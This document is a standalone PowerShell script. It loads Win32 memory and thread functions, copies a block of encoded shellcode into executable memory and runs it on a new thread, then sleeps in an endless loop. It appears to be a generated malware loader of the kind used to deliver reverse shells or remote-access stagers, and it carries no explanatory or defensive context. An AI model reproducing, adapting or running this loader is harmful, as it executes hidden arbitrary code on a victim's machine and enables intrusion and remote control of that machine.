$Ufj = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Ufj -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xe9,0x2e,0xce,0xb6,0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xea,0xfc,0x03,0x42,0xe6,0xcc,0x3b,0x4a,0x10,0x92,0xc4,0xb3,0xe0,0xf3,0x4d,0x56,0xd1,0x33,0x29,0x12,0x41,0x84,0x39,0x76,0x6d,0x6f,0x6f,0x63,0xe6,0x1d,0xb8,0x84,0x4f,0xab,0x9e,0xab,0x50,0x80,0xe3,0xaa,0xd2,0xdb,0x37,0x0d,0xeb,0x13,0x4a,0x4c,0x2c,0x49,0xa7,0x1c,0xe5,0x05,0x1a,0xb1,0x82,0x50,0xa7,0x3a,0xd8,0x75,0xaf,0xdf,0xa8,0x74,0x9e,0x71,0xa3,0x2e,0x00,0x73,0x60,0x5b,0x09,0x6b,0x65,0x66,0xc3,0x00,0x5d,0x1c,0xd2,0xc0,0xac,0xdd,0x79,0x2d,0x01,0x2c,0x83,0x69,0xa5,0xcf,0xf6,0x83,0xd6,0x72,0x01,0x50,0xa5,0xa8,0x84,0x43,0x0d,0x3a,0x3e,0xa8,0xac,0xef,0xd9,0x3b,0xa2,0x44,0xad,0x64,0xa6,0x5b,0x62,0x1f,0xd2,0xd0,0x85,0xf0,0x53,0xa2,0xa1,0xd4,0x38,0x70,0xcb,0x4d,0xe4,0xd7,0xf4,0x8e,0x47,0x87,0x50,0xc4,0x65,0xdc,0xe8,0x87,0xe1,0x11,0xc1,0x37,0xf1,0x3d,0x52,0x4b,0xc3,0xe2,0xc8,0xc3,0x6f,0x6a,0xd7,0x14,0x90,0x41,0xaf,0x8b,0x6f,0x6a,0xd0,0x82,0xab,0x3e,0x80,0xbc,0x1a,0x3f,0x4b,0x3d,0xa3,0xea,0xe6,0x38,0x33,0xd5,0x06,0xfd,0xab,0xbd,0xea,0x02,0x2a,0x85,0x62,0xe4,0x7c,0xa9,0x24,0xb9,0x3c,0x19,0x85,0x69,0xd4,0x73,0x0a,0x55,0xc4,0x7b,0xc0,0xfe,0x6e,0x94,0xbd,0x57,0x06,0x0d,0xe4,0x2c,0xb7,0xd2,0x32,0x49,0xf7,0x59,0xb1,0xad,0xb9,0xa9,0xbc,0xbd,0x2d,0x5a,0x8b,0x9c,0xfb,0x65,0x21,0x8a,0x03,0xf0,0xce,0x1d,0x54,0x6c,0xcd,0x78,0x92,0x33,0x2e,0xaf,0xa9,0xfa,0xba,0x10,0xc5,0x02,0x2b,0x91,0x15,0x55,0x21,0x91,0x7d,0x01,0x11,0xc2,0x98,0x4e,0x8c,0x76,0x31,0xdb,0x2f,0x2f,0xe6,0x4c,0x58,0xcd,0xd1,0xbb,0xc7,0x2e,0x34,0x3a,0x3b,0xf9,0x70,0x48,0x55,0x39;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Tmh=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Tmh.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Tmh,0,0,0);for (;;){Start-sleep 60};
